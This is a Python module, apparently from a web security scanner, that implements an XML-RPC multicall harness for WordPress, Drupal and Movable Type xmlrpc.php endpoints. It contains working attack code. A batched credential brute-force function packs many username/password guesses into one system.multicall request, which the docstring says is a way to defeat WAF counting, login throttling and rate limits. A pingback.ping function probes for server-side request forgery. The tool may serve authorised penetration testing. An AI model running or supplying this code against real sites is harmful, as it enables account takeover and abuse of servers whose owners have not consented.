"""XML-RPC multicall harness.

Many WordPress, Drupal, and Movable Type deployments expose an
``xmlrpc.php`` endpoint. That endpoint speaks XML-RPC and, more
importantly, supports ``system.multicall`` — a single HTTP request
that carries many method calls. It is a well-known way to defeat
WAF request counting, login throttling, and per-request rate limits.

This module is the harness. It knows how to:

- build a ``system.multicall`` envelope from a list of calls,
- parse XML-RPC responses (scalars, arrays, structs, faults),
- probe a target for XML-RPC reachability and enumerate methods,
- run batched credential attempts against auth-bearing methods,
- exercise ``pingback.ping`` as a server-side request forgery probe.

Transport is via ``requests``. XML is parsed with ``defusedxml``.
Nothing here knows about the scanner or the CLI.
"""

from __future__ import annotations

import time
from collections.abc import Iterable
from dataclasses import dataclass, field
from typing import Any

import defusedxml.ElementTree as ET  # noqa: N817 - ET is the conventional alias
import requests
from defusedxml.common import DefusedXmlException

XMLRPC_PATH_DEFAULT = "/xmlrpc.php"

DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# Methods worth listing when an endpoint is reachable.
METHODS_OF_INTEREST: tuple[str, ...] = (
    "system.listMethods",
    "system.multicall",
    "system.getCapabilities",
    "system.methodHelp",
    "system.methodSignature",
    "wp.getUsersBlogs",
    "wp.getUsers",
    "wp.getCategories",
    "metaWeblog.getCategories",
    "metaWeblog.getRecentPosts",
    "blogger.getUsersBlogs",
    "pingback.ping",
    "demo.sayHello",
)

# Methods that take (username, password) as their first two params,
# useful for batched credential attempts.
AUTH_METHODS: tuple[str, ...] = (
    "wp.getUsersBlogs",
    "wp.getUsers",
    "wp.getCategories",
    "metaWeblog.getCategories",
    "metaWeblog.getRecentPosts",
    "blogger.getUsersBlogs",
)

# ---------------------------------------------------------------------------
# Errors
# ---------------------------------------------------------------------------


class XmlRpcError(Exception):
    """Base class for XML-RPC transport/parse errors."""


class XmlRpcFault(XmlRpcError):  # noqa: N818
    """A ``<fault>`` response from the server."""

    def __init__(self, code: int | None, message: str) -> None:
        super().__init__(f"XML-RPC fault {code}: {message}")
        self.code = code
        self.message = message


# ---------------------------------------------------------------------------
# XML encoding
# ---------------------------------------------------------------------------


def _escape(text: Any) -> str:
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def encode_value(value: Any) -> str:
    """Encode a Python value as an XML-RPC ``<value>`` element."""
    if isinstance(value, bool):
        return f"<value><boolean>{1 if value else 0}</boolean></value>"
    if isinstance(value, int):
        return f"<value><int>{value}</int></value>"
    if isinstance(value, float):
        return f"<value><double>{value!r}</double></value>"
    if value is None:
        return "<value><nil/></value>"
    if isinstance(value, str):
        return f"<value><string>{_escape(value)}</string></value>"
    if isinstance(value, (bytes, bytearray)):
        import base64

        encoded = base64.b64encode(bytes(value)).decode("ascii")
        return f"<value><base64>{encoded}</base64></value>"
    if isinstance(value, (list, tuple)):
        inner = "".join(encode_value(v) for v in value)
        return f"<value><array><data>{inner}</data></array></value>"
    if isinstance(value, dict):
        members = "".join(
            f"<member><name>{_escape(k)}</name>{encode_value(v)}</member>"
            for k, v in value.items()
        )
        return f"<value><struct>{members}</struct></value>"
    raise TypeError(f"unsupported XML-RPC value type: {type(value).__name__}")


def build_call(method: str, params: Iterable[Any] = ()) -> str:
    """Build a ``<methodCall>`` document for a single method."""
    p = "".join(f"<param>{encode_value(v)}</param>" for v in params)
    return (
        '<?xml version="1.0"?>'
        f"<methodCall><methodName>{_escape(method)}</methodName>"
        f"<params>{p}</params></methodCall>"
    )


def build_multicall(calls: Iterable[tuple[str, Iterable[Any]]]) -> str:
    """Build a ``system.multicall`` envelope.

    ``calls`` is an iterable of ``(method_name, params)`` tuples.
    """
    structs = []
    for name, params in calls:
        structs.append({"methodName": name, "params": list(params)})
    return build_call("system.multicall", [structs])


# ---------------------------------------------------------------------------
# XML decoding
# ---------------------------------------------------------------------------


def _parse_value(elem: ET.Element) -> Any:
    """Decode a ``<value>`` element into a Python object."""
    children = list(elem)
    if not children:
        return elem.text or ""
    child = children[0]
    tag = child.tag
    if tag == "string":
        return child.text or ""
    if tag in ("int", "i4", "i8"):
        try:
            return int((child.text or "0").strip())
        except ValueError:
            return 0
    if tag == "double":
        try:
            return float((child.text or "0").strip())
        except ValueError:
            return 0.0
    if tag == "boolean":
        return (child.text or "0").strip() == "1"
    if tag == "nil":
        return None
    if tag in ("dateTime.iso8601", "base64"):
        return child.text or ""
    if tag == "array":
        data = child.find("data")
        if data is None:
            return []
        return [_parse_value(v) for v in data.findall("value")]
    if tag == "struct":
        out: dict[str, Any] = {}
        for member in child.findall("member"):
            name_elem = member.find("name")
            value_elem = member.find("value")
            if name_elem is None or value_elem is None:
                continue
            out[name_elem.text or ""] = _parse_value(value_elem)
        return out
    return child.text or ""


def parse_response(xml_text: str) -> tuple[Any, dict | None]:
    """Parse a ``<methodResponse>`` into ``(result, fault)``.

    Exactly one of the two is non-None on a well-formed response.
    Raises ``XmlRpcError`` on a malformed document.
    """
    if not xml_text or not xml_text.strip():
        raise XmlRpcError("empty response body")
    try:
        root = ET.fromstring(xml_text)
    except (ET.ParseError, DefusedXmlException) as exc:
        raise XmlRpcError(f"invalid XML: {exc}") from exc
    if root.tag != "methodResponse":
        raise XmlRpcError(f"unexpected root element: {root.tag}")

    fault_elem = root.find("fault")
    if fault_elem is not None:
        v = fault_elem.find("value")
        parsed = _parse_value(v) if v is not None else {}
        if not isinstance(parsed, dict):
            parsed = {"faultCode": None, "faultString": str(parsed)}
        return None, parsed

    params = root.find("params")
    if params is None:
        return None, None
    param = params.find("param")
    if param is None:
        return None, None
    value = param.find("value")
    if value is None:
        return None, None
    return _parse_value(value), None


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------


class XmlRpcClient:
    """Minimal XML-RPC client bound to a single endpoint."""

    def __init__(
        self,
        endpoint: str,
        timeout: float = 10.0,
        proxies: dict | None = None,
        session: requests.Session | None = None,
        user_agent: str | None = None,
    ) -> None:
        self.endpoint = endpoint
        self.timeout = timeout
        self.proxies = proxies
        self.session = session or requests.Session()
        self.user_agent = user_agent or DEFAULT_UA

    def _headers(self) -> dict:
        return {
            "User-Agent": self.user_agent,
            "Content-Type": "text/xml",
            "Accept": "text/xml, application/xml, */*;q=0.8",
            "Accept-Encoding": "identity",
            "Connection": "close",
        }

    def call_raw(self, method: str, params: Iterable[Any] = ()) -> requests.Response:
        body = build_call(method, params)
        return self.session.post(
            self.endpoint,
            data=body.encode("utf-8"),
            headers=self._headers(),
            timeout=self.timeout,
            allow_redirects=False,
            proxies=self.proxies,
        )

    def call(self, method: str, params: Iterable[Any] = ()) -> Any:
        r = self.call_raw(method, params)
        if r.status_code >= 400:
            raise XmlRpcError(f"HTTP {r.status_code}")
        result, fault = parse_response(r.text)
        if fault is not None:
            raise XmlRpcFault(fault.get("faultCode"), fault.get("faultString", ""))
        return result

    def multicall_raw(
        self, calls: Iterable[tuple[str, Iterable[Any]]]
    ) -> requests.Response:
        body = build_multicall(calls)
        return self.session.post(
            self.endpoint,
            data=body.encode("utf-8"),
            headers=self._headers(),
            timeout=self.timeout,
            allow_redirects=False,
            proxies=self.proxies,
        )

    def multicall(self, calls: Iterable[tuple[str, Iterable[Any]]]) -> list[Any]:
        r = self.multicall_raw(calls)
        if r.status_code >= 400:
            raise XmlRpcError(f"HTTP {r.status_code}")
        result, fault = parse_response(r.text)
        if fault is not None:
            raise XmlRpcFault(fault.get("faultCode"), fault.get("faultString", ""))
        if not isinstance(result, list):
            raise XmlRpcError(f"multicall returned {type(result).__name__}, not array")
        return result


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------


@dataclass
class XmlRpcProfile:
    endpoint: str
    reachable: bool = False
    server_header: str = ""
    methods: list[str] = field(default_factory=list)
    multicall_supported: bool = False
    pingback_supported: bool = False
    notes: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "endpoint": self.endpoint,
            "reachable": self.reachable,
            "server_header": self.server_header,
            "methods": list(self.methods),
            "multicall_supported": self.multicall_supported,
            "pingback_supported": self.pingback_supported,
            "notes": list(self.notes),
        }


def resolve_endpoint(base_url: str) -> str:
    """Return the XML-RPC endpoint URL for a base URL.

    If the URL already looks like an XML-RPC endpoint (path ends with
    ``xmlrpc.php`` or contains ``xmlrpc``) it is returned unchanged.
    """
    base = (base_url or "").strip()
    if not base:
        return base
    lowered = base.lower()
    if lowered.endswith("xmlrpc.php") or "/xmlrpc" in lowered:
        return base
    return base.rstrip("/") + XMLRPC_PATH_DEFAULT


def detect(
    base_url: str,
    client: XmlRpcClient | None = None,
    timeout: float = 10.0,
    proxies: dict | None = None,
    session: requests.Session | None = None,
) -> XmlRpcProfile:
    """Probe an endpoint and return an ``XmlRpcProfile``."""
    endpoint = resolve_endpoint(base_url)
    client = client or XmlRpcClient(
        endpoint, timeout=timeout, proxies=proxies, session=session
    )
    profile = XmlRpcProfile(endpoint=endpoint)

    try:
        r = client.call_raw("system.listMethods", [])
    except requests.RequestException as exc:
        profile.notes.append(f"transport error: {exc}")
        return profile

    profile.server_header = r.headers.get("Server", "")

    if r.status_code >= 400:
        profile.notes.append(f"HTTP {r.status_code}")
        return profile
    if not (r.text or "").strip():
        profile.notes.append("empty body")
        return profile

    try:
        result, fault = parse_response(r.text)
    except XmlRpcError as exc:
        profile.notes.append(str(exc))
        return profile

    profile.reachable = True

    if fault is not None:
        profile.notes.append(
            f"system.listMethods fault: {fault.get('faultString', fault)}"
        )
        profile.multicall_supported = _try_multicall(client)
        return profile

    if isinstance(result, list):
        profile.methods = [str(m) for m in result]
    else:
        profile.notes.append(f"system.listMethods returned {type(result).__name__}")

    profile.multicall_supported = "system.multicall" in profile.methods
    if not profile.multicall_supported:
        profile.multicall_supported = _try_multicall(client)

    profile.pingback_supported = "pingback.ping" in profile.methods
    return profile


def _try_multicall(client: XmlRpcClient) -> bool:
    """Best-effort check that ``system.multicall`` is accepted."""
    try:
        r = client.multicall_raw([("system.listMethods", [])])
    except requests.RequestException:
        return False
    if r.status_code >= 400:
        return False
    try:
        result, fault = parse_response(r.text)
    except XmlRpcError:
        return False
    if fault is not None:
        return False
    return isinstance(result, list)


# ---------------------------------------------------------------------------
# Multicall-driven credential attempts
# ---------------------------------------------------------------------------


@dataclass
class XmlRpcAttempt:
    username: str
    password: str
    method: str
    success: bool = False
    fault_code: int | None = None
    fault_message: str = ""
    value: Any = None

    def to_dict(self) -> dict:
        return {
            "username": self.username,
            "password": self.password,
            "method": self.method,
            "success": self.success,
            "fault_code": self.fault_code,
            "fault_message": self.fault_message,
        }


def _classify_entry(entry: Any) -> tuple[bool, int | None, str, Any]:
    """Decode one multicall response entry.

    A success entry is a single-element array ``[value]``; a fault
    entry is a struct containing ``faultCode`` and ``faultString``.
    """
    if isinstance(entry, dict) and "faultCode" in entry:
        code = entry.get("faultCode")
        try:
            code = int(code) if code is not None else None
        except (TypeError, ValueError):
            code = None
        return False, code, str(entry.get("faultString", "")), None
    if isinstance(entry, list):
        return True, None, "", (entry[0] if entry else None)
    return True, None, "", entry


def bruteforce_multicall(
    client: XmlRpcClient,
    usernames: Iterable[str],
    passwords: Iterable[str],
    method: str = "wp.getUsersBlogs",
    batch_size: int = 50,
    delay: float = 0.0,
    sleep=time.sleep,
    progress=None,
) -> list[XmlRpcAttempt]:
    """Run batched credential attempts and return every attempt.

    ``method`` should be one of ``AUTH_METHODS`` (or a server-specific
    method that takes ``(username, password)`` as its first two
    parameters).
    """
    users = list(usernames)
    pwds = list(passwords)
    pairs = [(u, p) for u in users for p in pwds]
    if not pairs:
        return []

    batch_size = max(1, int(batch_size))
    attempts: list[XmlRpcAttempt] = []

    def emit_failure(current_batch, message, code=None):
        for u, p in current_batch:
            attempts.append(
                XmlRpcAttempt(
                    username=u,
                    password=p,
                    method=method,
                    success=False,
                    fault_code=code,
                    fault_message=message,
                )
            )
        if progress:
            progress(len(attempts), len(pairs))
        if delay:
            sleep(delay)

    for start in range(0, len(pairs), batch_size):
        batch = pairs[start : start + batch_size]
        calls = [(method, [u, p]) for u, p in batch]

        try:
            r = client.multicall_raw(calls)
        except requests.RequestException as exc:
            emit_failure(batch, f"transport error: {exc}")
            continue

        if r.status_code >= 400:
            emit_failure(batch, f"HTTP {r.status_code}")
            continue

        try:
            result, fault = parse_response(r.text)
        except XmlRpcError as exc:
            emit_failure(batch, f"parse error: {exc}")
            continue

        if fault is not None:
            emit_failure(
                batch,
                str(fault.get("faultString", "")),
                code=fault.get("faultCode"),
            )
            continue

        if not isinstance(result, list):
            emit_failure(
                batch,
                f"multicall returned {type(result).__name__}, not array",
            )
            continue

        for (u, p), entry in zip(batch, result, strict=False):
            ok, code, msg, value = _classify_entry(entry)
            attempts.append(
                XmlRpcAttempt(
                    username=u,
                    password=p,
                    method=method,
                    success=ok and bool(value),
                    fault_code=code,
                    fault_message=msg,
                    value=value,
                )
            )

        if progress:
            progress(len(attempts), len(pairs))
        if delay:
            sleep(delay)

    return attempts


# ---------------------------------------------------------------------------
# Pingback / SSRF probe
# ---------------------------------------------------------------------------


def pingback_probe(
    client: XmlRpcClient,
    target_url: str,
    source_url: str = "http://example.com/",
) -> tuple[bool, str]:
    """Ask the server to fetch ``source_url`` via ``pingback.ping``.

    A successful call does not prove the target fetched the source;
    it only proves the server accepted the pingback request.
    """
    try:
        result = client.call("pingback.ping", [source_url, target_url])
    except XmlRpcFault as exc:
        return False, f"fault {exc.code}: {exc.message}"
    except XmlRpcError as exc:
        return False, str(exc)
    except requests.RequestException as exc:
        return False, f"transport error: {exc}"
    return True, str(result)
